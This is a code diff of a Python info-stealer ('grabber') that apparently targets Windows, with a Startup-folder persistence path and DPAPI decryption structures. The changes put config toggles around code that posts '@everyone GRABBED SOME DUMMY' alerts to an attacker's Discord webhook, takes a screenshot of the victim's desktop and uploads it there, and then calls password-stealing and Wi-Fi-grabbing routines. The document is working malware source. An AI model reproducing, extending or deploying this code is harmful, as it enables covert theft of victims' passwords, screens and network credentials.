@@ -80,25 +80,26 @@ startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 Threadlist = []
 DETECTED = False
 
-payload1 = {
-    "content":
-    "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
-    "username": wh_name,
-    "avatar_url": wh_avatar,
-}
-payload2 = {
-    "content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif",
-    "username": wh_name,
-    "avatar_url": wh_avatar,
-}
-payload3 = {
-    "content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif",
-    "username": wh_name,
-    "avatar_url": wh_avatar,
-}
-response = requests.post(webhook, json=payload1)
-response = requests.post(webhook, json=payload2)
-response = requests.post(webhook, json=payload3)
+if cc.get_discord_ping():
+    payload1 = {
+        "content":
+        "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
+        "username": wh_name,
+        "avatar_url": wh_avatar,
+    }
+    payload2 = {
+        "content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif",
+        "username": wh_name,
+        "avatar_url": wh_avatar,
+    }
+    payload3 = {
+        "content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif",
+        "username": wh_name,
+        "avatar_url": wh_avatar,
+    }
+    response = requests.post(webhook, json=payload1)
+    response = requests.post(webhook, json=payload2)
+    response = requests.post(webhook, json=payload3)
 
 
 class DATA_BLOB(Structure):
@@ -826,12 +827,13 @@ def send_malicious():
     malicious.wifigr()
 
 
-screenshot = ImageGrab.grab()
-screenshot.save("screenshot.png")
-files = {"screenshot": open("screenshot.png", "rb")}
-requests.post(webhook, files=files)
-files["screenshot"].close()
-os.remove("screenshot.png")
+if cc.get_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save("screenshot.png")
+    files = {"screenshot": open("screenshot.png", "rb")}
+    requests.post(webhook, files=files)
+    files["screenshot"].close()
+    os.remove("screenshot.png")
 
 if cc.get_password_stealing() is True:
     wikith = Kiwi()
